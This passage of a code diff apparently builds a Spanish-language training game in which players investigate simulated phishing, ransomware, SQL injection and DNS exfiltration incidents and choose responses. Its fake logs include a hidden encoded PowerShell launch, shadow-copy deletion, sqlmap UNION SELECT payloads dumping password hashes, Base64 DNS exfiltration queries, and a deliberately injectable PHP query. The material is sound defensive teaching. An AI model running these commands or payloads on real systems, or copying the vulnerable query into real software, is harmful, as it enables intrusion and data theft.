+        { t: 'Borrar el correo de phishing del buzón de Laura.', s: 3, imp: 15, min: 5, why: 'Limpias la evidencia, pero el atacante sigue dentro de la cuenta.' },
+        { t: 'Apagar el correo de toda la empresa.', s: 6, imp: 5, min: 30, why: 'Frena el ataque pero paraliza a 120 personas por una sola cuenta. Es desproporcionado.' },
+      ],
+    },
+    {
+      phase: 'Erradicación',
+      q: 'Revisaste el buzón y el envío masivo. ¿Qué sacas y qué bloqueas?',
+      extra: { src: 'consola de correo · revisión', lines: [
+        '> Get-InboxRule -Mailbox lsepulveda',
+        'Name  Enabled  ForwardTo                                   DeleteMessage',
+        '.     True     archivo.seguro@correo-externo.example        True',
+        '> Message trace subj="Factura pendiente #8841" (últimas 24 h)',
+        'Entregados: 46   Abiertos: 19   Clic en cordillera-login.example: 3 (pagos2, bodega1, rrhh3)',
+      ] },
+      opts: [
+        { t: 'Borrar la regla de reenvío, purgar el correo de los 46 buzones, bloquear ambos dominios falsos y tratar como comprometidas las 3 cuentas que hicieron clic.', s: 20, imp: -10, min: 20, why: 'Cierras la fuga por reenvío, sacas el anzuelo de todos los buzones y te adelantas a las otras tres víctimas.' },
+        { t: 'Borrar solo la regla de reenvío.', s: 8, imp: 10, min: 5, why: 'Hay 3 personas más que hicieron clic y que probablemente entregaron su contraseña.' },
+        { t: 'Bloquear solo el dominio cordillera-login.example.', s: 8, imp: 10, min: 5, why: 'Sirve para que nadie más caiga, pero la regla sigue sacando correos y las 3 cuentas siguen expuestas.' },
+        { t: 'Mandar un correo a todos pidiendo que no abran la factura.', s: 4, imp: 5, min: 5, why: 'Avisar está bien, pero no reemplaza borrar la regla ni revisar las cuentas.' },
+      ],
+    },
+    {
+      phase: 'Recuperación',
+      q: 'Las cuentas están limpias. ¿Qué haces para cerrar el caso?',
+      opts: [
+        { t: 'Activar MFA para todos, revisar con Finanzas que no se pagó ninguna factura falsa, avisar a clientes y proveedores que pudieron recibir el correo y hacer una charla corta de phishing.', s: 20, imp: -10, min: 30, why: 'Con MFA, una contraseña robada ya no basta. Revisar pagos es clave porque el objetivo final suele ser el dinero.' },
+        { t: 'Exigir cambio de contraseña a todos cada 30 días.', s: 6, imp: 0, min: 10, why: 'Las guías actuales (NIST SP 800-63B) desaconsejan forzar cambios periódicos sin motivo. MFA protege mucho más.' },
+        { t: 'Bloquear todo el correo que venga de fuera de la empresa.', s: 3, imp: 5, min: 10, why: 'Una empresa de logística vive de hablar con clientes y proveedores. No es viable.' },
+        { t: 'Volver a la normalidad, el problema ya se resolvió.', s: 0, imp: 15, min: 0, why: 'Sin MFA ni revisión de pagos, el próximo phishing tendrá el mismo final.' },
+      ],
+    },
+  ],
+  lesson: 'Cuando una cuenta de correo cae, el atacante suele crear reglas de reenvío ocultas y usar la cuenta para engañar a otros (incluso para desviar pagos, lo que se llama BEC). Las pistas: dominios parecidos, SPF que falla, inicios de sesión desde otro país o con agentes raros. Contener es revocar sesiones, no solo cambiar la clave, y la mejor defensa a futuro es MFA.',
+},
+{
+  id: 'ransom', ico: '🔒', title: 'Archivos con candado', company: 'Clínica Valle Verde', sector: 'Salud · 2 sedes',
+  ticket: 'INC-0427', sev: 'critica', start: '08:58', impact: 25,
+  brief: 'En recepción no pueden abrir las fichas de pacientes del servidor de archivos FS01: todas terminan en .lckd y apareció un LEEME_RECUPERAR.txt. El EDR del equipo RECEP-03 (192.168.50.33) entrega esta telemetría. Cada minuto cuenta.',
+  src: 'edr · RECEP-03 · 2026-10-08',
+  hint: 'Sigue la cadena de procesos: ¿qué abrió Excel? ¿qué abrió ese proceso? Prueba grep "svchost32" o grep "EXCEL".',
+  logs: [
+    ['08:30:12 RECEP-03 logon user=recepcion type=interactive', ''],
+    ['08:41:02 RECEP-03 OUTLOOK.EXE  file_write  C:\\Users\\recepcion\\Downloads\\Resultados_examenes.xlsm', 'Llega un adjunto .xlsm: un Excel con macros, desde un correo externo.'],
+    ['08:41:20 RECEP-03 EXCEL.EXE    open        Resultados_examenes.xlsm  macros=enabled', 'Alguien abrió el archivo y habilitó las macros.'],
+    ['08:41:24 RECEP-03 EXCEL.EXE    spawn       powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi...', 'Excel lanzando PowerShell oculto con un comando codificado en Base64: señal muy típica de malware.'],
+    ['08:41:26 RECEP-03 powershell.exe net_conn  203.0.113.88:443', 'PowerShell se conecta a un servidor externo para bajar la siguiente etapa.'],
+    ['08:41:31 RECEP-03 powershell.exe file_write C:\\Users\\recepcion\\AppData\\Roaming\\svchost32.exe', 'Escribe un ejecutable con nombre que imita a svchost.exe, pero en una carpeta de usuario.'],
+    ['08:44:10 RECEP-03 MsMpEng.exe  scan        quick_scan result=clean', ''],
+    ['08:45:03 RECEP-03 chrome.exe   net_conn    192.168.50.10:443 (intranet.valleverde.example)', ''],
+    ['08:50:00 RECEP-03 wuauclt.exe  update      KB5031356 status=downloaded', ''],
+    ['08:52:15 RECEP-03 svchost32.exe spawn      vssadmin.exe delete shadows /all /quiet', 'Borra las instantáneas (shadow copies) para que no puedas recuperar versiones anteriores.'],
+    ['08:53:01 RECEP-03 svchost32.exe file_rename \\\\FS01\\fichas\\paciente_0012.pdf -> paciente_0012.pdf.lckd', 'Empieza a cifrar y renombrar archivos en el servidor de archivos.'],
+    ['08:53:58 RECEP-03 svchost32.exe file_rename 1.842 archivos en \\\\FS01\\fichas (60 s)', 'Cientos de archivos renombrados por minuto: cifrado masivo.'],
+    ['08:54:05 RECEP-03 svchost32.exe file_write \\\\FS01\\fichas\\LEEME_RECUPERAR.txt', 'Deja la nota de rescate.'],
+  ],
+  fpNote: 'El escaneo de Defender, la conexión a la intranet y la actualización de Windows son actividad normal del equipo.',
+  classify: {
+    q: '¿Qué tipo de incidente es?',
+    opts: [
+      { t: 'Ransomware que entró por un Excel con macros adjunto a un correo.', s: 20, imp: 0, min: 4, why: 'Correcto. Adjunto .xlsm → macro → PowerShell oculto → descarga → borra respaldos → cifra archivos → nota de rescate.' },
+      { t: 'Phishing sin mayores consecuencias.', s: 3, imp: 10, min: 10, why: 'Empezó con phishing, pero ya hay casi dos mil fichas cifradas.' },
+      { t: 'Falla del disco del servidor FS01.', s: 0, imp: 15, min: 20, why: 'Un disco dañado no renombra archivos ni deja notas de rescate.' },
+      { t: 'La actualización de Windows renombró los archivos.', s: 0, imp: 15, min: 20, why: 'La actualización solo se descargó. Quien renombra es svchost32.exe.' },
+    ],
+  },
+  steps: [
+    {
+      phase: 'Contención',
+      q: 'El cifrado sigue avanzando. ¿Qué haces ya?',
+      opts: [
+        { t: 'Aislar RECEP-03 de la red (con el EDR o sacando el cable) sin apagarlo, y desconectar el recurso compartido de FS01.', s: 20, imp: -5, min: 3, why: 'Cortas el cifrado y la propagación de inmediato, y mantienes la memoria del equipo para el análisis forense.' },
+        { t: 'Apagar todos los computadores de la clínica.', s: 8, imp: 5, min: 20, why: 'Frena el cifrado, pero paraliza la atención de pacientes y borra la evidencia en memoria.' },
+        { t: 'Correr un antivirus completo en RECEP-03 mientras sigue conectado.', s: 3, imp: 20, min: 30, why: 'Mientras escanea, el ransomware sigue cifrando FS01. Primero se aísla.' },
+        { t: 'Pagar el rescate para recuperar rápido.', s: 0, imp: 25, min: 60, why: 'No hay garantía de recibir la llave, financias al crimen y no cierras la puerta de entrada. Siempre es el último recurso y lo decide la dirección con asesoría legal.' },
+      ],
+    },
+    {
+      phase: 'Erradicación',
+      q: 'Hiciste una búsqueda en toda la red. ¿Cómo sacas el malware?',
+      extra: { src: 'búsqueda de amenazas · toda la red', lines: [
+        'hash svchost32.exe  sha256=9f2c...e41a  equipos: RECEP-03',
+        'adjunto Resultados_examenes.xlsm recibido por: 6 buzones',
+        'abierto en: RECEP-03 (macros habilitadas), ADMIN-07 (macros bloqueadas por el EDR)',
+        'conexiones a 203.0.113.88: RECEP-03',
+      ] },
+      opts: [
+        { t: 'Reinstalar RECEP-03 desde una imagen limpia, revisar ADMIN-07, borrar el adjunto de los 6 buzones, bloquear 203.0.113.88 y el hash, y cambiar la contraseña de recepcion.', s: 20, imp: -10, min: 40, why: 'Con ransomware no confíes en "limpiar": reinstalar es lo seguro. Y te encargas de cada lugar donde estuvo el anzuelo.' },
+        { t: 'Borrar svchost32.exe y seguir usando el equipo.', s: 6, imp: 10, min: 10, why: 'Puede haber dejado otra persistencia (tareas programadas, claves de registro). No sabes qué más hizo.' },
+        { t: 'Solo bloquear la IP 203.0.113.88.', s: 5, imp: 10, min: 5, why: 'El malware ya está en el equipo y el adjunto sigue en 5 buzones más.' },
+        { t: 'Formatear el servidor FS01.', s: 4, imp: 10, min: 60, why: 'FS01 fue la víctima, no el origen. El malware estaba en RECEP-03.' },
+      ],
+    },
+    {
+      phase: 'Recuperación',
+      q: '¿Cómo recuperas las fichas de los pacientes?',
+      opts: [
+        { t: 'Restaurar desde el respaldo offline de anoche, verificar que los archivos abren bien antes de reconectar, bloquear macros de archivos de internet y evaluar el aviso a pacientes y autoridades.', s: 20, imp: -15, min: 90, why: 'Un respaldo desconectado de la red es lo que el ransomware no pudo tocar. Y son datos de salud: hay que evaluar la notificación con el área legal.' },
+        { t: 'Restaurar desde las shadow copies de Windows.', s: 0, imp: 10, min: 15, why: 'Revisa el log: a las 08:52 el malware ejecutó "vssadmin delete shadows /all". Ya no existen.' },
+        { t: 'Buscar en internet un descifrador gratuito.', s: 4, imp: 5, min: 60, why: 'A veces existen (por ejemplo en No More Ransom), pero no es un plan si tienes respaldos. Y bajar herramientas al azar es otro riesgo.' },
+        { t: 'Reconectar FS01 y pedir al personal que rehaga las fichas.', s: 2, imp: 15, min: 30, why: 'Pierdes historial clínico y reconectas sin verificar nada.' },
+      ],
+    },
+  ],
+  lesson: 'El ransomware casi siempre deja una cadena clara en la telemetría: adjunto con macros, Office lanzando PowerShell, descarga, borrado de shadow copies y renombrado masivo. Contener es aislar de la red, no apagar ni pagar. Lo que salva a la organización es la preparación: respaldos offline probados y macros bloqueadas. En Chile, la Ley Marco de Ciberseguridad (21.663) obliga a ciertas instituciones a reportar incidentes al CSIRT Nacional, así que la notificación también es parte de la respuesta.',
+},
+{
+  id: 'sqli', ico: '🛒', title: 'La tienda que hablaba de más', company: 'Tienda Nimbus', sector: 'E-commerce · 40 mil clientes',
+  ticket: 'INC-0433', sev: 'alta', start: '14:20', impact: 20,
+  brief: 'El monitoreo detectó un pico de errores 500 en tienda.nimbus.example y una respuesta de 400 KB en una página que normalmente pesa 5 KB. Te pasan el access.log del servidor web.',
+  src: 'web01:/var/log/nginx/access.log',
+  hint: 'Fíjate en el parámetro id de /productos y en el user-agent. Una comilla suelta, AND 1=1, UNION SELECT... Prueba grep "sqlmap".',
+  logs: [
+    ['192.0.2.14 - - [08/Oct/2026:14:02:11 -0300] "GET /productos?id=12 HTTP/1.1" 200 5120 "-" "Mozilla/5.0 (Android 14)"', ''],
+    ['192.0.2.50 - - [08/Oct/2026:14:02:40 -0300] "GET /carrito HTTP/1.1" 200 2210 "-" "Mozilla/5.0 (Macintosh)"', ''],
+    ["198.51.100.61 - - [08/Oct/2026:14:05:01 -0300] \"GET /productos?id=12' HTTP/1.1\" 500 312 \"-\" \"sqlmap/1.7.2#stable\"", 'Una comilla en id provoca un error 500: la entrada llega cruda a la base de datos. Y el user-agent es sqlmap, herramienta de inyección SQL.'],
+    ['198.51.100.61 - - [08/Oct/2026:14:05:02 -0300] "GET /productos?id=12%20AND%201=1 HTTP/1.1" 200 5120 "-" "sqlmap/1.7.2#stable"', 'Prueba booleana: con una condición verdadera la página sale normal.'],
+    ['198.51.100.61 - - [08/Oct/2026:14:05:02 -0300] "GET /productos?id=12%20AND%201=2 HTTP/1.1" 200 98 "-" "sqlmap/1.7.2#stable"', 'Con una condición falsa la página sale vacía (98 bytes). Confirma que es inyectable.'],
+    ['192.0.2.77 - - [08/Oct/2026:14:05:30 -0300] "POST /login HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Windows NT 10.0)"', ''],
+    ['198.51.100.61 - - [08/Oct/2026:14:06:10 -0300] "GET /productos?id=12%20UNION%20SELECT%20NULL,NULL,NULL-- HTTP/1.1" 200 5130 "-" "sqlmap/1.7.2#stable"', 'UNION SELECT con tres columnas: busca cuántas columnas tiene la consulta para pegar sus propios datos.'],
+    ['198.51.100.61 - - [08/Oct/2026:14:06:44 -0300] "GET /productos?id=-1%20UNION%20SELECT%20table_name,2,3%20FROM%20information_schema.tables-- HTTP/1.1" 200 8840 "-" "sqlmap/1.7.2#stable"', 'Lista las tablas de la base de datos.'],
+    ['192.0.2.80 - - [08/Oct/2026:14:07:02 -0300] "GET /img/logo.png HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone)"', ''],
+    ['198.51.100.61 - - [08/Oct/2026:14:07:15 -0300] "GET /productos?id=-1%20UNION%20SELECT%20email,password_hash,3%20FROM%20clientes-- HTTP/1.1" 200 412880 "-" "sqlmap/1.7.2#stable"', 'Extrae correos y hashes de contraseñas de la tabla clientes: 412 KB de respuesta. Hay fuga de datos.'],
+    ['192.0.2.14 - - [08/Oct/2026:14:08:20 -0300] "GET /productos?id=27 HTTP/1.1" 200 5098 "-" "Mozilla/5.0 (Android 14)"', ''],
+  ],
+  fpNote: 'Las visitas normales piden id con un número y pesan unos 5 KB. El 304 del logo es el navegador usando su caché.',
+  classify: {
+    q: '¿Qué ataque sufrió la tienda?',
+    opts: [
+      { t: 'Inyección SQL con extracción de datos de clientes.', s: 20, imp: 0, min: 6, why: 'Correcto: comilla que rompe la consulta, pruebas booleanas, UNION SELECT y, al final, correos y hashes de la tabla clientes.' },
+      { t: 'Cross-site scripting (XSS).', s: 5, imp: 10, min: 15, why: 'XSS inyecta código que corre en el navegador de otros usuarios. Aquí los payloads son SQL y atacan la base de datos.' },
+      { t: 'Fuerza bruta contra el login.', s: 3, imp: 10, min: 15, why: 'Solo hay un POST /login y es normal. El ataque está en /productos.' },
+      { t: 'DDoS que botó el sitio.', s: 0, imp: 15, min: 20, why: 'Son unas pocas peticiones de una IP. El pico de errores 500 viene de las pruebas de inyección.' },
+    ],
+  },
+  steps: [
+    {
+      phase: 'Contención',
+      q: 'La vulnerabilidad sigue abierta. ¿Qué haces?',
+      opts: [
+        { t: 'Poner una regla en el WAF que bloquee patrones SQL en /productos (o sacar esa página temporalmente) y bloquear 198.51.100.61.', s: 20, imp: -5, min: 10, why: 'Cierras la puerta en la página vulnerable sin botar toda la tienda. Bloquear la IP es un extra, no la solución.' },
+        { t: 'Bloquear solo la IP 198.51.100.61.', s: 8, imp: 10, min: 5, why: 'El atacante cambia de IP en segundos con una VPN, y la página sigue vulnerable para cualquiera.' },
+        { t: 'Apagar la tienda completa hasta nuevo aviso.', s: 6, imp: 5, min: 30, why: 'Detiene el ataque, pero pierdes todas las ventas cuando bastaba con proteger una página.' },
+        { t: 'Borrar los logs para que no quede registro.', s: 0, imp: 25, min: 5, why: 'Destruyes la evidencia que necesitas para saber qué se filtró. Además puede ser un problema legal.' },
+      ],
+    },
+    {
+      phase: 'Erradicación',
+      q: 'Encontraste el código vulnerable. ¿Cómo lo corriges?',
+      extra: { src: 'web01:/var/www/tienda/productos.php', lines: [
+        '$id  = $_GET[\'id\'];',
+        '$sql = "SELECT nombre, precio, stock FROM productos WHERE id = " . $id;',
+        '$res = $db->query($sql);',
+      ] },
+      opts: [
+        { t: 'Usar consultas parametrizadas (prepared statements), validar que id sea un número y buscar el mismo patrón en el resto del código.', s: 20, imp: -10, min: 30, why: 'Con parámetros, la base de datos nunca interpreta la entrada como SQL. Es la solución de raíz que recomienda OWASP.' },
+        { t: 'Escapar las comillas de $id.', s: 6, imp: 5, min: 15, why: 'Aquí id es numérico y va sin comillas: "-1 UNION SELECT..." no tiene ni una comilla. Escapar no lo frena.' },
+        { t: 'Filtrar la palabra UNION.', s: 4, imp: 10, min: 10, why: 'Las listas negras se saltan fácil (uNiOn, comentarios, otras técnicas). No ataca la causa.' },
+        { t: 'Cambiarle el nombre a la tabla clientes.', s: 0, imp: 15, min: 10, why: 'El atacante puede volver a listar las tablas desde information_schema, como ya hizo.' },
+      ],
+    },
+    {
+      phase: 'Recuperación',
+      q: 'Se filtraron correos y hashes. ¿Qué haces?',
+      opts: [
+        { t: 'Rotar las credenciales de la base de datos, forzar cambio de contraseña a los clientes, avisarles con transparencia y confirmar que los hashes usen bcrypt o Argon2.', s: 20, imp: -15, min: 60, why: 'Asumes que los hashes se pueden crackear y actúas antes. Si el hash era débil (MD5, SHA-1), migrar es urgente.' },
+        { t: 'Avisar a los clientes, pero sin forzar el cambio de contraseña.', s: 8, imp: 5, min: 20, why: 'La transparencia está bien, pero quien no cambie la clave queda expuesto si crackean su hash.' },
+        { t: 'No decir nada para cuidar la imagen de la tienda.', s: 0, imp: 25, min: 0, why: 'Los clientes no pueden protegerse y, si se sabe después, el daño de imagen y legal es mucho mayor.' },
+        { t: 'Reactivar la página y seguir vendiendo.', s: 0, imp: 15, min: 0, why: 'Los datos ya salieron. Hay que actuar sobre las cuentas de los clientes.' },
+      ],
+    },
+  ],
+  lesson: 'La inyección SQL sigue en el Top 10 de OWASP porque nace de algo simple: pegar la entrada del usuario dentro de una consulta. En el log se reconoce por comillas, AND 1=1 / 1=2, UNION SELECT, information_schema y respuestas de tamaño anormal. Bloquear una IP no sirve; la corrección real son las consultas parametrizadas.',
+},
+{
+  id: 'dns', ico: '📡', title: 'Susurros por DNS', company: 'Cooperativa Austral', sector: 'Servicios financieros · 8 oficinas',
+  ticket: 'INC-0441', sev: 'alta', start: '10:30', impact: 15,
+  brief: 'No hay nada caído y nadie reclama. Pero la regla "DNS anómalo" del SIEM saltó con el equipo CONTA-02 (10.20.0.44), de Contabilidad. Revisas los logs del DNS interno y del firewall.',
+  src: 'siem · dns + firewall · 2026-10-08',
+  hint: 'Mira cada cuánto consulta CONTA-02 el mismo dominio y qué tan largos son los subdominios. ¿Alguno parece Base64? Prueba grep "10.20.0.44".',
+  logs: [
+    ['10:00:00 DNS  client=10.20.0.15 query=intranet.austral.example type=A rcode=NOERROR', ''],
+    ['10:00:04 DNS  client=10.20.0.44 query=q3vb7n.update-cdn-sync.example type=TXT rcode=NOERROR', 'Consulta TXT a un dominio raro con un subdominio aleatorio. Los registros TXT pueden traer órdenes de un servidor de comando y control (C2).'],
+    ['10:00:31 DNS  client=10.20.0.21 query=correo.austral.example type=A rcode=NOERROR', ''],
+    ['10:01:04 DNS  client=10.20.0.44 query=k9fm2a.update-cdn-sync.example type=TXT rcode=NOERROR', 'Exactamente 60 segundos después, otra vez. Ese ritmo fijo se llama beaconing: el malware se reporta con su jefe.'],
+    ['10:02:04 DNS  client=10.20.0.44 query=z1pq8r.update-cdn-sync.example type=TXT rcode=NOERROR', 'Y otra vez a los 60 segundos.'],
+    ['10:02:30 DNS  client=10.20.0.15 query=noticias.diario-sur.example type=A rcode=NOERROR', ''],
+    ['10:03:04 DNS  client=10.20.0.44 query=w7hc0d.update-cdn-sync.example type=TXT rcode=NOERROR', 'El beacon sigue puntual.'],
+    ['10:04:12 DNS  client=10.20.0.30 query=impresora-p2.austral.local type=A rcode=NXDOMAIN', ''],
+    ['10:05:10 DNS  client=10.20.0.44 query=UEsDBBQAAAAIADIwMjYtY2xpZW50ZXMuY3N2.d1.update-cdn-sync.example type=A rcode=NXDOMAIN', 'Subdominio larguísimo en Base64: empieza con "UEsDB", que es el inicio de un archivo ZIP (PK). Están sacando datos por DNS.'],
+    ['10:05:10 DNS  client=10.20.0.44 query=lY6VjpWOlY6VjpWOlY6VjpWOkT3x8sQ.d2.update-cdn-sync.example type=A rcode=NXDOMAIN', 'Segundo trozo (d2) del mismo archivo.'],
+    ['10:05:11 FW   allow udp 10.20.0.44:53122 -> 192.0.2.53:53', 'CONTA-02 consulta un DNS externo directo, saltándose el DNS interno. Ningún PC de la oficina debería hacerlo.'],
+    ['10:05:40 FW   allow tcp 10.20.0.21:50544 -> 10.20.0.5:443', ''],
+    ['10:06:02 DNS  client=10.20.0.44 query=b4nm1x.update-cdn-sync.example type=TXT rcode=NOERROR', 'Vuelve al beacon de siempre.'],
+  ],
+  fpNote: 'El NXDOMAIN de la impresora es un nombre mal configurado, no un ataque. La conexión a 10.20.0.5:443 es tráfico interno a un servidor de la cooperativa.',
+  classify: {
+    q: '¿Qué está haciendo CONTA-02?',
+    opts: [
+      { t: 'Tiene malware que se comunica con un C2 por DNS y está exfiltrando un archivo.', s: 20, imp: 0, min: 6, why: 'Correcto: beacon cada 60 s con consultas TXT y subdominios en Base64 que codifican un ZIP llamado 2026-clientes.csv.' },
+      { t: 'Un servidor DNS mal configurado.', s: 3, imp: 10, min: 15, why: 'Las demás máquinas resuelven bien. El patrón raro es solo de CONTA-02 y a un único dominio.' },
+      { t: 'Un ataque DDoS por amplificación DNS.', s: 4, imp: 10, min: 15, why: 'La amplificación usa respuestas enormes hacia una víctima. Aquí son consultas chicas y regulares desde un solo PC.' },
+      { t: 'Navegación normal del usuario.', s: 0, imp: 15, min: 20, why: 'Nadie navega a un dominio cada 60 segundos exactos con consultas TXT y subdominios aleatorios.' },
+    ],
+  },
+  steps: [
+    {
+      phase: 'Contención',
+      q: 'Los datos se están yendo. ¿Qué haces?',
+      opts: [
+        { t: 'Aislar CONTA-02, bloquear (sinkhole) update-cdn-sync.example en el DNS interno y bloquear en el firewall todo DNS saliente que no venga del resolver interno.', s: 20, imp: -5, min: 10, why: 'Cortas el equipo, el dominio y el atajo al DNS externo. Esa última regla frena esta técnica en toda la red.' },
+        { t: 'Bloquear solo el dominio update-cdn-sync.example.', s: 10, imp: 5, min: 5, why: 'Bien, pero el malware puede tener dominios de respaldo y ya sabe usar un DNS externo, que sigue permitido.' },
+        { t: 'Cortar internet a toda la cooperativa.', s: 6, imp: 5, min: 30, why: 'Detiene la fuga, pero paraliza las 8 oficinas cuando el problema es un solo PC.' },
+        { t: 'Pedirle al usuario que reinicie el PC.', s: 0, imp: 15, min: 10, why: 'El malware tiene persistencia y vuelve a arrancar.' },
+      ],
+    },
+    {
+      phase: 'Erradicación',
+      q: 'Revisaste CONTA-02. ¿Qué haces con lo que encontraste?',
+      extra: { src: 'CONTA-02 · revisión forense', lines: [
+        '> schtasks /query /tn "OneDriveSyncHelper" /v',
+        'Tarea: OneDriveSyncHelper   Disparador: al iniciar sesión',
+        'Acción: C:\\ProgramData\\cdnsync\\cdnsync.exe',
+        '> historial de instalación',
+        '2026-09-17  ExcelPro_Full_crack.exe   (descargado de un sitio de software pirata)',
+      ] },
+      opts: [
+        { t: 'Reinstalar CONTA-02, buscar el hash de cdnsync.exe y el dominio en todos los equipos, quitar el software pirata y cambiar las credenciales usadas en ese PC.', s: 20, imp: -10, min: 45, why: 'Lleva tres semanas dentro: pudo robar contraseñas. Buscar en toda la red (threat hunting) confirma que no hay más equipos infectados.' },
+        { t: 'Borrar la tarea programada.', s: 6, imp: 10, min: 5, why: 'El ejecutable sigue ahí y puede tener otras formas de arrancar.' },
+        { t: 'Borrar cdnsync.exe.', s: 5, imp: 10, min: 5, why: 'Llegó con un crack instalado hace tres semanas. No sabes qué más quedó.' },
+        { t: 'Dejarlo funcionando para estudiar al atacante.', s: 0, imp: 20, min: 0, why: 'Con datos de clientes saliendo, no es momento de investigar. Eso se hace en un laboratorio aislado.' },
+      ],
+    },
+    {
+      phase: 'Recuperación',
+      q: '¿Cómo cierras el incidente?',
+      opts: [
+        { t: 'Reconstruir qué datos salieron decodificando los trozos de Base64, evaluar con Legal el aviso a los socios y a la autoridad, y dejar una alerta permanente de DNS anómalo.', s: 20, imp: -15, min: 60, why: 'Los mismos logs te dicen qué se llevaron. Con eso dimensionas el daño y cumples con la obligación de informar.' },
+        { t: 'Pasar el antivirus por todos los equipos y cerrar el caso.', s: 6, imp: 5, min: 30, why: 'Ayuda, pero no responde lo más importante: qué datos de los socios salieron.' },
+        { t: 'Restaurar el PC y olvidarse del tema.', s: 0, imp: 15, min: 10, why: 'Salió un archivo de clientes de una cooperativa financiera. Ignorarlo no es opción.' },
+        { t: 'Cambiar de proveedor de internet.', s: 0, imp: 10, min: 30, why: 'El proveedor no tuvo nada que ver: el malware llegó con software pirata.' },
+      ],
+    },
+  ],
+  lesson: 'DNS casi nunca se bloquea, por eso el malware lo usa para hablar con su C2 y sacar datos. Las pistas: consultas a intervalos fijos (beaconing), registros TXT a dominios raros, subdominios largos en Base64 y PCs que usan un DNS externo directo. Forzar que todo el DNS pase por tu resolver interno y vigilarlo es una defensa barata y muy efectiva. Y el software pirata es una puerta de entrada clásica.',
+},
+];
+
+/* ---------- estado ---------- */
+let G = null; // partida en curso
+const PHASES = ['Detección', 'Contención', 'Erradicación', 'Recuperación'];
+
+function show(id) {
+  ['scrMenu', 'scrGame', 'scrReport'].forEach(s => $(s).classList.toggle('hidden', s !== id));
+  $('btnMenu').classList.toggle('hidden', id === 'scrMenu');
+  window.scrollTo({ top: 0 });
+}
+
+function toast(msg) {
+  const t = document.createElement('div');
+  t.className = 'toast'; t.textContent = msg;
+  document.body.appendChild(t);
+  setTimeout(() => t.remove(), 1800);
+}
+
+/* ---------- menú ---------- */
+function starsFor(pct) { return pct >= 90 ? 3 : pct >= 65 ? 2 : pct >= 40 ? 1 : 0; }
+const starStr = n => '★'.repeat(n) + '☆'.repeat(3 - n);
+const sevLabel = { media: 'Media', alta: 'Alta', critica: 'Crítica' };
+
+function renderMenu() {
+  const box = $('levels');
+  box.innerHTML = '';
+  CASES.forEach((c, i) => {
+    const b = document.createElement('button');
+    b.type = 'button'; b.className = 'level';
+    const locked = i + 1 > save.unlocked;
+    b.disabled = locked;
+    const best = save.best[c.id];
+    b.innerHTML =
+      `<span class="num"><span>Caso ${i + 1} · ${esc(c.ticket)}</span><span class="sev ${c.sev}">${sevLabel[c.sev]}</span></span>` +
+      `<span class="name">${c.ico} ${esc(c.title)}</span>` +
+      `<span class="co">${esc(c.company)} · ${esc(c.sector)}</span>` +
+      `<span class="best">${locked ? '🔒 Bloqueado' : best ? `${starStr(best.stars)} · ${best.pct}%` : 'Sin jugar'}</span>`;
+    b.onclick = () => startCase(i);
+    box.appendChild(b);
+  });
+}
+
+/* confirm() no funciona dentro del visor de la app: se confirma tocando dos veces */
+function confirmTap(btn, fn) {
+  if (btn.dataset.armed) { clearTimeout(btn._t); btn.innerHTML = btn.dataset.armed; delete btn.dataset.armed; fn(); return; }
+  btn.dataset.armed = btn.innerHTML; btn.textContent = '¿Seguro? Toca otra vez';
+  btn._t = setTimeout(() => { btn.innerHTML = btn.dataset.armed; delete btn.dataset.armed; }, 3000);
+}
+$('btnReset').onclick = () => confirmTap($('btnReset'), () => {
+  save = { unlocked: 1, best: {} }; persist(); renderMenu();
+});
+$('btnMenu').onclick = () => { renderMenu(); show('scrMenu'); };
+
+/* ---------- partida ---------- */
+function maxScore(c) {
+  return 30 + 20 + c.steps.reduce((a, s) => a + Math.max(...s.opts.map(o => o.s)), 0);
+}
+
+function startCase(i) {
+  const c = CASES[i];
+  const [h, m] = c.start.split(':').map(Number);
+  G = { i, c, score: 0, impact: c.impact, clock: h * 60 + m, phase: 0, sub: 'mark', sel: new Set(), hintUsed: false, log: [] };
+  $('hudCase').textContent = `Caso ${i + 1}/${CASES.length}`;
+  $('tkIco').textContent = c.ico;
+  $('tkId').textContent = c.ticket;
+  $('tkSev').className = 'sev ' + c.sev;
+  $('tkSev').textContent = sevLabel[c.sev];
+  $('tkCo').textContent = c.company;
+  $('tkTitle').textContent = c.title;
+  $('tkBrief').textContent = c.brief;
+  $('grep').value = '';
+  updateHud();
+  renderPhaseBar();
+  renderDetection();
+  show('scrGame');
+}
+
+const clockStr = m => { m = ((m % 1440) + 1440) % 1440; return String(Math.floor(m / 60)).padStart(2, '0') + ':' + String(m % 60).padStart(2, '0'); };
+
+function updateHud() {
+  G.impact = Math.max(0, Math.min(100, G.impact));
+  $('hudScore').textContent = G.score;
+  $('hudClock').textContent = clockStr(G.clock);
+  $('hudImpact').textContent = G.impact + '%';
+  const f = $('hudFill');
+  f.style.width = G.impact + '%';
+  f.style.background = G.impact >= 60 ? 'var(--bad)' : G.impact >= 30 ? 'var(--warn)' : 'var(--ok)';
+}
+
+function renderPhaseBar() {
+  $('phaseBar').innerHTML = PHASES.map((p, k) =>
+    `<span class="st ${k < G.phase ? 'done' : k === G.phase ? 'here' : ''}">${k < G.phase ? '✓' : k + 1} · ${p}</span>`
+  ).join('<span class="ar">→</span>');
+}
+
+/* ---------- consola ---------- */
+let logState = null; // { lines, mode, src }
+
+function renderLogs() {
+  const q = $('grep').value.trim().toLowerCase();
+  const box = $('logs');
+  const { lines, mode } = logState;
+  let shown = 0;
+  box.innerHTML = lines.map((ln, k) => {
+    const text = Array.isArray(ln) ? ln[0] : ln;
+    if (q && !text.toLowerCase().includes(q)) return '';
+    shown++;
+    let cls = 'ln', why = '';
+    if (mode === 'mark') { if (G.sel.has(k)) cls += ' sel'; }
+    else if (mode === 'review') {
+      const bad = !!ln[1], picked = G.sel.has(k);
+      if (bad && picked) { cls += ' hit'; why = ln[1]; }
+      else if (bad) { cls += ' miss'; why = ln[1]; }
+      else if (picked) { cls += ' fp'; why = 'Esta línea es actividad normal.'; }
+      cls += ' read';
+    } else cls += ' read';
+    let body = esc(text);
+    if (q) {
+      const idx = text.toLowerCase().indexOf(q);
+      body = esc(text.slice(0, idx)) + '<mark>' + esc(text.slice(idx, idx + q.length)) + '</mark>' + esc(text.slice(idx + q.length));
+    }
